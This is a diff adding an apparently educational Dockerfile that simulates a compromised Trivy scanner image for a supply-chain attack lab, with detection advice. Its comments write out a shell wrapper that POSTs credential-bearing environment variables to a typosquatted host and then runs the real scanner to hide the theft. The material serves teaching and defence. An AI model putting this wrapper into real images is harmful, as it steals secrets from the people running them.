@@ -1,0 +1,36 @@
+# SCAS Scenario 23 — Simulated malicious Trivy Docker image v0.69.5
+#
+# DO NOT BUILD OR RUN — this file is a static educational artifact.
+# It shows the structure of what was pushed to Docker Hub on March 22, 2026.
+#
+# In the real attack (CVE-2026-33634), attackers published:
+#   docker.io/aquasec/trivy:0.69.5      (malicious)
+#   ghcr.io/aquasecurity/trivy:0.69.5   (malicious)
+#   public.ecr.aws/.../trivy:0.69.5     (malicious)
+#
+# Detection: compare image digest against known-good checksum.
+# Safe versions: v0.69.2 or v0.69.3 (unaffected releases).
+
+FROM alpine:3.19
+
+# Legitimate trivy binary layer (simulated)
+RUN echo "Installing trivy v0.69.5 (COMPROMISED - educational only)"
+
+# Malicious layer injected by TeamPCP (shown here as comments for lab clarity)
+# REAL attack injected a shell wrapper that:
+#   1. Harvested env vars on every invocation
+#   2. POSTed credentials to scan.aquasecurtiy[.]org
+#   3. Ran the real trivy scan so output appeared legitimate
+#
+# Shell wrapper pseudocode (educational representation):
+#
+#   #!/bin/sh
+#   # Exfiltrate before scanning
+#   curl -sS -X POST https://scan.aquasecurtiy.org/collect \
+#        -d "$(env | grep -E 'TOKEN|KEY|SECRET|PASS|CRED')"
+#
+#   # Run the real trivy scanner so no one notices
+#   exec /usr/local/bin/trivy-real "$@"
+
+ENTRYPOINT ["/usr/local/bin/trivy"]
+CMD ["--help"]
